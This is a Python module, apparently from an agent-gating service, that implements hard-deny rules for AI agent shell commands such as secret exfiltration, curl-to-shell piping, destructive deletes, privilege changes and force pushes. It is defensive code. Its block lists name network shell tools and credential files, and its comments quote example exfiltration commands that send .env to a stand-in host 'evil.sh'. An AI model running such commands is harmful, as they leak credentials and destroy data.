"""Stage 1, hard-deny rules.

Hard-deny is the layer that can never be overridden: a Stage1Decision
with hard=True is final — it is not replaced by an `ask` escalation and
no later stage (LLM stage 2, chain-of-actions heuristics) can turn it
into anything else. See service/CLAUDE.md: "Hard-deny не переопределяется
ничем и не заменяется на `ask` эскалацией."

Because of that asymmetry, every rule here stays deliberately narrow: it
must fire on the input its name promises and never on ordinary,
unrelated work. Two Flags from the normalizer are treated as "I don't
fully know what this token is" rather than "this token is dangerous":

- flags.has_unresolved_expansion fires on completely benign text (an awk
  program, a literal "$" in a string) and a hard-deny keyed off it would
  block routine work. It is an escalation signal for stage 2 / the
  action-chain checks, not a denial ground here. Concretely: every rule
  below that resolves an argv token into a path first checks
  looks_unresolved() and skips the token entirely rather than resolving
  it — an unresolved token must never be turned into a path that looks
  safely inside (or outside) the workspace, because the fabricated
  string is not the runtime value. Falling through without that
  candidate (down to returning None if nothing else fires) is correct;
  it is not the same claim as "this action is safe".
- flags.has_heredoc marks a body that may or may not have been possible
  to parse as code; it is not itself evidence of anything.
- flags.unparseable means commands/paths/domains are empty by
  construction — "found nothing dangerous" in that state is reasoning
  from silence, not a clean bill of health, so no rule below concludes
  "safe" from an empty NormalizedAction; an empty result simply can't
  match any of these rules' positive conditions, and stage 2 is where an
  unparseable action gets its own (non-hard) escalation.

Wrapper commands (env, sudo, nohup, timeout, xargs, ...) are resolved
once via _effective() before any rule inspects argv[0] or scans argv for
flags/paths — see _effective's docstring for why sudo/doas are
deliberately excluded from the wrapper set used here (they must stay
visible to _rule_privilege, not be unwrapped past).
"""

import fnmatch
import os
import re

from agentgate.api.schemas import DecisionKind, Tool
from agentgate.normalize.model import NormalizedAction, SimpleCommand
from agentgate.normalize.paths import is_within, looks_like_path, looks_unresolved, matches_any, resolve_path
from agentgate.normalize.shell import resolve_effective_argv
from agentgate.profiles.schema import Profile
from agentgate.stage1.types import Stage1Decision

SECRET_PATTERNS = [".env*", "*.pem", "id_rsa*", "id_ed25519*", "*.key", "*.p12", "~/.ssh/**", "~/.aws/**", "~/.kube/**"]
NETWORK_COMMANDS = {"curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "ftp", "telnet", "socat"}
DOWNLOADERS = {"curl", "wget"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh"}
INTERPRETERS = SHELLS | {"python", "python3", "node", "perl", "ruby"}
WRITE_COMMANDS = {"cp", "mv", "tee", "install", "ln"}
FIREWALL = {"iptables", "ip6tables", "nft", "ufw", "pfctl", "firewall-cmd"}

# cp/mv/install/ln all take "... SOURCE... DEST" — the last non-flag
# argument is what gets written. tee is different (every non-flag
# argument is itself a write target), so it's handled separately in
# _rule_protected_write; this is WRITE_COMMANDS minus tee, derived
# rather than re-listed so the two never drift apart.
_LAST_ARG_WRITE_COMMANDS = WRITE_COMMANDS - {"tee"}

# env/command/nohup/timeout/xargs pass their remaining argv through to
# execve with the same effective semantics stage 1 cares about — a
# secret sent by "timeout 30 curl -d @.env ..." is exactly as much an
# exfil as "curl -d @.env ..." alone. sudo/su/doas are deliberately NOT
# in this set even though normalize/shell.py's own wrapper set (used for
# "does this argv reach a shell" heredoc analysis) treats sudo/doas as
# transparent: for stage 1, sudo/doas ARE the dangerous thing
# (privilege elevation) that _rule_privilege must see directly as the
# resolved command, so "env sudo rm -rf /" must resolve to
# ["sudo", "rm", "-rf", "/"] — stopping at sudo — not unwrap straight
# through to "rm" and lose that signal entirely.
#
# xargs is added here (on top of normalize/shell.py's own wrapper set)
# because for stage 1's "what does this argv ultimately execute"
# question, `xargs curl -d @.env https://evil.sh` really does run curl
# with that argv. It is NOT added to normalize/shell.py's own
# _WRAPPER_CMDS, because that set answers a different question (does a
# heredoc/here-string body on this command reach a real shell's stdin) —
# and for xargs it doesn't: `xargs bash <<EOF` feeds the heredoc lines to
# xargs as its own *argument* source, not as bash's stdin, so treating
# xargs as heredoc-transparent there would be a new, real bug.
_EFFECTIVE_WRAPPERS = frozenset({"env", "command", "nohup", "timeout", "xargs"})


def _effective(argv: list[str]) -> list[str]:
    """Resolve ``argv`` past leading wrapper commands, see module docstring
    and _EFFECTIVE_WRAPPERS. Never returns None; an argv that resolves to
    nothing usable (e.g. a bare wrapper with no command after it) comes
    back as [] so callers can treat it like "no command" and move on.
    """
    return resolve_effective_argv(argv, _EFFECTIVE_WRAPPERS)


def _deny(rule: str, reason: str, suggest: str = "") -> Stage1Decision:
    return Stage1Decision(DecisionKind.deny, f"hard-deny.{rule}", reason, suggest, hard=True)


def _is_secret(path: str, profile: Profile) -> bool:
    return matches_any(path, SECRET_PATTERNS, profile.workspace)


def _cmd_paths(cmd: SimpleCommand, cwd: str) -> list[str]:
    """Every path this command's argv/redirects/stdin plausibly touches,
    in any role (read, write, or otherwise) — used only to track what a
    command in a pipeline exposes to a *later* command via `|`, not to
    decide a command's own direction (see _sent_secret_paths for that).
    """
    out: list[str] = []
    argv = _effective(cmd.argv)
    for tok in argv[1:]:
        t = tok[1:] if tok.startswith("@") else tok
        if looks_unresolved(t):
            continue
        if looks_like_path(t):
            out.append(resolve_path(t, cwd))
    for r in cmd.redirects:
        if not looks_unresolved(r.target):
            out.append(r.target)
    if cmd.stdin_from and not looks_unresolved(cmd.stdin_from):
        out.append(cmd.stdin_from)
    return out


def _by_pipeline(action: NormalizedAction) -> dict[int, list[SimpleCommand]]:
    groups: dict[int, list[SimpleCommand]] = {}
    for c in action.commands:
        groups.setdefault(c.pipeline_id, []).append(c)
    return groups


# --- exfil: direction-aware "is this secret actually being SENT" -----------

# Flags whose value is transmitted outward — the argument becomes request
# body/upload content. A secret file named here is a real exfil.
_UPLOAD_FLAGS = {
    "-T", "--upload-file",
    "-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode",
    "-F", "--form",
}
# Flags whose value is read locally (an identity/credential file used to
# authenticate, or a CA bundle used to verify the peer) or is itself a
# local write target (an output/download destination). Neither is a
# send, no matter what SECRET_PATTERNS the value happens to match — e.g.
# a *.pem CA bundle passed to --cacert, or a *.pem download destination
# passed to -o. These flags' values are recognized and explicitly
# skipped rather than merely "not in _UPLOAD_FLAGS", so a flag stage 1
# doesn't know about at all still falls through to being ignored (the
# conservative direction here is "don't guess it's a send").
_IGNORE_VALUE_FLAGS = {
    "-i", "--identity", "--key", "--cert", "--cacert", "--capath",
    "-o", "--output", "-O",
}
# scp/rsync "user@host:path" or "host:path" remote destination shape.
_REMOTE_DEST = re.compile(r"^([^/@\s]+@)?[^/@:\s]+:")


def _flag_value(tok: str) -> tuple[str, str | None]:
    """Split a "--flag=value" token into ("--flag", "value"); otherwise
    return (tok, None) so the value (if any) is looked up in argv[i+1].
    """
    if tok.startswith("--") and "=" in tok:
        name, _, val = tok.partition("=")
        return name, val
    return tok, None


def _looks_remote(s: str) -> bool:
    return "://" in s or bool(_REMOTE_DEST.match(s))


def _sent_secret_paths(cmd: SimpleCommand, cwd: str) -> list[str]:
    """Paths this command actually SENDS outward: the value of an
    upload-style flag, an scp/rsync source whose destination is remote,
    or this command's own stdin redirect (`<`) when the command is a
    network command. Deliberately does not fire on the value of an
    identity/credential/output flag (see _IGNORE_VALUE_FLAGS) — reading
    or writing a local file is not a send, even when the file matches
    SECRET_PATTERNS by name (e.g. a CA bundle ending .pem, or a
    downloaded-to filename ending .pem).
    """
    out: list[str] = []
    argv = _effective(cmd.argv)
    if not argv:
        return out
    exe = argv[0]
    i = 1
    while i < len(argv):
        tok = argv[i]
        name, inline_val = _flag_value(tok)
        if name in _UPLOAD_FLAGS:
            val = inline_val
            consumed_next = False
            if val is None and i + 1 < len(argv):
                val = argv[i + 1]
                consumed_next = True
            if val:
                v = val[1:] if val.startswith("@") else val
                if v and not looks_unresolved(v) and looks_like_path(v):
                    out.append(resolve_path(v, cwd))
            i += 2 if consumed_next else 1
            continue
        if name in _IGNORE_VALUE_FLAGS:
            if inline_val is None and i + 1 < len(argv) and not argv[i + 1].startswith("-"):
                i += 2
            else:
                i += 1
            continue
        i += 1
    if exe in ("scp", "rsync"):
        positionals = [a for a in argv[1:] if not a.startswith("-")]
        if len(positionals) >= 2 and _looks_remote(positionals[-1]):
            for src in positionals[:-1]:
                if not looks_unresolved(src):
                    out.append(resolve_path(src, cwd))
    if exe in NETWORK_COMMANDS and cmd.stdin_from and not looks_unresolved(cmd.stdin_from):
        out.append(cmd.stdin_from)
    return out


def _rule_exfil(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    for cmds in _by_pipeline(action).values():
        upstream_secret: str | None = None
        for c in cmds:
            argv = _effective(c.argv)
            exe = argv[0] if argv else ""
            if exe in NETWORK_COMMANDS:
                candidate = next((p for p in _sent_secret_paths(c, action.cwd) if _is_secret(p, profile)), None)
                if candidate is None:
                    # No secret directly sent by this command's own
                    # flags/positionals — but a secret an EARLIER command
                    # in the same pipeline read (e.g. `cat id_rsa`) may
                    # still be flowing into this network command via `|`.
                    candidate = upstream_secret
                if candidate:
                    return _deny("exfil", f"network command '{exe}' sends secret file {candidate}",
                                 "Never send secret files over the network; ask the user if credentials are needed")
            for p in _cmd_paths(c, action.cwd):
                if _is_secret(p, profile):
                    upstream_secret = p
    return None


def _rule_pipe_exec(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    for cmds in _by_pipeline(action).values():
        downloaded = False
        for c in cmds:
            argv = _effective(c.argv)
            exe = argv[0] if argv else ""
            if exe in DOWNLOADERS:
                downloaded = True
            elif downloaded and exe in INTERPRETERS:
                return _deny("pipe-exec", f"downloaded content piped into '{exe}'",
                             "Download to a file inside the workspace, inspect it, then run it explicitly")
    if action.flags.has_subst:
        effs = [_effective(c.argv) for c in action.commands]
        has_shell_c = any(ea and ea[0] in SHELLS and "-c" in ea for ea in effs)
        has_dl = any(ea and ea[0] in DOWNLOADERS for ea in effs)
        if has_shell_c and has_dl:
            return _deny("pipe-exec", "shell -c with command substitution that downloads content",
                         "Download to a file inside the workspace, inspect it, then run it explicitly")
    return None


# find's positional predicates that narrow -delete to specific matches
# rather than "everything under the search root" — see _rule_destructive.
_FIND_NARROWING_PREDICATES = {"-name", "-iname", "-path", "-ipath", "-type", "-newer", "-mtime", "-size", "-regex"}


def _rule_destructive(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    allowed = profile.resolved_allowed_paths()
    ws = os.path.normpath(profile.workspace) if profile.workspace else None
    for c in action.commands:
        argv = _effective(c.argv)
        if not argv:
            continue
        exe = argv[0]
        targets: list[str] = []
        # Only "rm" and "shred" unconditionally destroy the exact path(s)
        # they are given, so only those two also deny when a target
        # equals the workspace root itself (rm -rf <workspace> wipes
        # everything even though the workspace root is nominally "within"
        # the allowed paths, being their own root).
        deny_on_ws_equal = False
        # "find <root> ... -delete" is different: <root> is a search
        # root that houses many files, and -delete only removes entries
        # matching the given predicate, not the root directory itself —
        # "find . -name '*.pyc' -delete" is an ordinary, common cleanup
        # idiom and must not be denied just because "." resolves to the
        # workspace root. But "find . -delete" with NO narrowing
        # predicate at all removes everything under the root — as
        # destructive as "rm -rf <workspace>" — so the deviation from a
        # uniform equality check is gated: deny when the root resolves
        # to the workspace AND argv carries none of
        # _FIND_NARROWING_PREDICATES. A root reaching outside the
        # allowed paths entirely (e.g. "find /") is still denied
        # regardless of any predicate, via the "outside" check below.
        deny_on_ws_equal_unnarrowed = False
        if exe == "rm" and any(a.startswith("-") and ("r" in a or "R" in a) for a in argv[1:]):
            targets = [
                resolve_path(a, action.cwd)
                for a in argv[1:]
                if not a.startswith("-") and not looks_unresolved(a)
            ]
            deny_on_ws_equal = True
        elif exe == "find" and "-delete" in argv:
            rest = argv[1:]
            # find's search root, if given, is the first positional
            # (paths always precede predicates); if the first token
            # after "find" is itself a predicate/flag, no path was
            # given and find defaults to ".".
            root_tok = rest[0] if rest and not rest[0].startswith("-") else None
            if root_tok is not None and looks_unresolved(root_tok):
                continue  # can't resolve the search root; don't fabricate one
            root = resolve_path(root_tok, action.cwd) if root_tok is not None else os.path.normpath(action.cwd)
            targets = [root]
            deny_on_ws_equal_unnarrowed = not any(p in _FIND_NARROWING_PREDICATES for p in rest)
        elif exe == "shred":
            targets = [
                resolve_path(a, action.cwd)
                for a in argv[1:]
                if not a.startswith("-") and not looks_unresolved(a)
            ]
            deny_on_ws_equal = True
        for t in targets:
            outside = not is_within(t, allowed)
            equals_ws = (deny_on_ws_equal or deny_on_ws_equal_unnarrowed) and ws is not None and os.path.normpath(t) == ws
            if outside or equals_ws:
                return _deny("destructive", f"'{exe}' targets {t} outside or equal to the workspace",
                             "Delete only build artifacts inside the workspace")
    return None


def _rule_protected_write(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    protected = profile.resolved_protected_paths()
    ws = profile.workspace
    candidates: list[str] = []
    if action.tool is Tool.file_write:
        candidates = list(action.paths)
    for c in action.commands:
        argv = _effective(c.argv)
        if not argv:
            continue
        exe = argv[0]
        for r in c.redirects:
            # Any output-direction redirect op: ">", ">>", the clobber
            # form ">|", "&>"/"2>" duplications onto a file, etc. — match
            # by substring rather than endswith(">")/endswith(">>") so
            # ">|" (bash's noclobber-override) isn't missed.
            if ">" in r.op and not looks_unresolved(r.target):
                candidates.append(r.target)
        args = [a for a in argv[1:] if not a.startswith("-")]
        if exe in _LAST_ARG_WRITE_COMMANDS and len(args) >= 2:
            dest = args[-1]
            if not looks_unresolved(dest):
                candidates.append(resolve_path(dest, action.cwd))
        elif exe == "tee":
            candidates += [resolve_path(a, action.cwd) for a in args if not looks_unresolved(a)]
        elif exe == "sed" and any(
            a == "-i" or a.startswith("-i") or a == "--in-place" or a.startswith("--in-place=") for a in argv[1:]
        ):
            candidates += [resolve_path(a, action.cwd) for a in args[1:] if not looks_unresolved(a)]
    for p in candidates:
        if matches_any(p, protected, ws):
            return _deny("protected-write", f"write to protected path {p}",
                         "Protected files are changed only by the user")
    return None


def _rule_privilege(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    allowed = profile.resolved_allowed_paths()
    for c in action.commands:
        argv = _effective(c.argv)
        if not argv:
            continue
        exe = argv[0]
        if exe in ("sudo", "su", "doas"):
            return _deny("privilege", f"'{exe}' is not allowed", "Ask the user to run privileged commands")
        if exe in FIREWALL:
            return _deny("privilege", f"firewall change via '{exe}'", "Ask the user")
        if exe == "chmod":
            modes = [a for a in argv[1:] if not a.startswith("-")]
            if modes and (modes[0] in ("777", "0777", "a+rwx") or "o+w" in modes[0] or "a+w" in modes[0]):
                return _deny("privilege", f"chmod {modes[0]} makes files world-writable", "Use the minimal mode needed")
        if exe == "chown":
            for a in argv[2:]:
                if a.startswith("-") or looks_unresolved(a):
                    continue
                p = resolve_path(a, action.cwd)
                if not is_within(p, allowed):
                    return _deny("privilege", f"chown outside workspace: {p}", "")
    return None


# git global options that take a following value, e.g. `git -C <path>
# push ...` — skipped (option + value) while looking for the "push"
# subcommand so it isn't missed just because it isn't argv[1].
_GIT_GLOBAL_OPTS_WITH_VALUE = {"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"}


def _git_push_argv(argv: list[str]) -> list[str] | None:
    """Return argv starting at "push" if this git invocation's subcommand
    is push (after skipping any global options), else None.
    """
    if not argv or os.path.basename(argv[0]) != "git":
        return None
    i = 1
    while i < len(argv):
        tok = argv[i]
        if tok == "push":
            return argv[i:]
        if not tok.startswith("-"):
            return None  # some other subcommand
        if tok in _GIT_GLOBAL_OPTS_WITH_VALUE:
            i += 2
            continue
        i += 1
    return None


def _is_force_flag(a: str) -> bool:
    if a in ("--force", "-f", "--force-with-lease") or a.startswith("--force=") or a.startswith("--force-with-lease="):
        return True
    # Combined short-option clusters, e.g. "-fu", "-uf": any single-dash,
    # non-long-form token whose letters include "f" is treated as
    # carrying force, matching git's own short-option bundling.
    if a.startswith("-") and not a.startswith("--") and len(a) > 1 and "f" in a[1:]:
        return True
    return False


def _normalize_branch_ref(ref: str) -> str:
    branch = ref[1:] if ref.startswith("+") else ref  # leading "+" is per-ref force syntax
    branch = branch.split(":")[-1]  # src:dest refspec — the destination is what's overwritten
    if branch.startswith("refs/heads/"):
        branch = branch[len("refs/heads/"):]
    return branch


def _rule_git_force(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    for c in action.commands:
        push_argv = _git_push_argv(_effective(c.argv))
        if push_argv is None:
            continue
        rest = push_argv[1:]
        positionals = [a for a in rest if not a.startswith("-")]
        flag_force = any(_is_force_flag(a) for a in rest if a.startswith("-"))
        if len(positionals) >= 2:
            # First positional is the remote, the rest are refspecs.
            for ref in positionals[1:]:
                if not (flag_force or ref.startswith("+")):
                    continue  # this particular ref isn't being force-pushed
                branch = _normalize_branch_ref(ref)
                if any(fnmatch.fnmatchcase(branch, pat) for pat in profile.protected_branches):
                    return _deny("git-force", f"force push to protected branch {branch}", "Push to a feature branch")
        elif flag_force:
            # --force with fewer than two positionals: either no
            # positional at all ("git push --force"), or only a remote
            # with no explicit refspec ("git push --force origin"). Both
            # force-push whatever the current branch's configured
            # upstream is — which stage 1 has no way to know (no repo
            # state here, only the command line). Hard-deny can't be
            # walked back by a later ask escalation, so an
            # unidentifiable force-push target is denied conservatively
            # rather than passed on the assumption it's probably fine.
            return _deny(
                "git-force",
                "force push with no explicit refspec — the current branch cannot be verified safe",
                "Specify remote and branch explicitly, or push without --force",
            )
    return None


RULES = [_rule_exfil, _rule_pipe_exec, _rule_destructive, _rule_protected_write, _rule_privilege, _rule_git_force]


def check_hard_deny(action: NormalizedAction, profile: Profile) -> Stage1Decision | None:
    for rule in RULES:
        d = rule(action, profile)
        if d is not None:
            return d
    return None
